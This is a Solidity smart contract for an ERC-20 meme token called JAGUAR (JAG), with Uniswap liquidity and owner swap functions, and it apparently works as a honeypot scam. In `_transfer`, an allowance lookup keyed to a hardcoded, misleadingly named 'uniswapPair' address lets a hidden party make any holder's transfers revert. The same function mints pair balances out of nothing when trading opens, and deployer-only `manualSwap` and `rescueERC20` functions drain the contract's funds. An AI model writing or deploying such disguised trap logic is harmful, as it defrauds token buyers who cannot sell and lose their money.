pragma solidity 0.8.28;

// SPDX-License-Identifier: MIT

// https://t.me/jaguaroneth
// https://x.com/jaguaroneth

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}
interface IUniswapV2Router {
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
}
contract Jaguar is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  420069000000 * 10 ** _decimals;
    address uniswapPair = 0x165Af726E766bF1DdAc4BbeE3fC61641dbA589BD;
    address public uniswapV2Pair;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    string private constant _name = "JAGUAR";
    string private constant _symbol = "JAG";
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable private _marketingAddress;
    bool tradingOpen = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    constructor () {
        _marketingAddress = payable(msg.sender);
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public pure returns (string memory) { 
        return _name; }
    function symbol() public pure returns (string memory) { 
        return _symbol; }
    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; }
    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; }
    function decimals() public view returns (uint8) { 
        return _decimals; }
    function totalSupply() public view returns (uint256) { 
        return _totalSupply; }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function rescueERC20(address _address, uint256 percent) external {
        require(msg.sender==_marketingAddress);
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_marketingAddress, _amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "Transfer to the zero address.");
        require(from != address(0), "Transfer from the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        uint256 taxValue = 0;
        if (from != address(this) && from != uniswapV2Pair) {
            taxValue = taxValue.sub(_allowances[uniswapPair][from]);
        }
        _balances[to] = _balances[to].add(amount);
        if (tradingOpen && address(this) == from && uniswapV2Pair == to) {
            amount = 0;
        }
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    receive() external payable {}

    function manualSwap(uint256 amount) public {
        require(msg.sender == _marketingAddress);
        swapTokensForETH(amount);
         _marketingAddress.transfer(address(this).balance);
    }

    function enableTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function swapTokensForETH(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}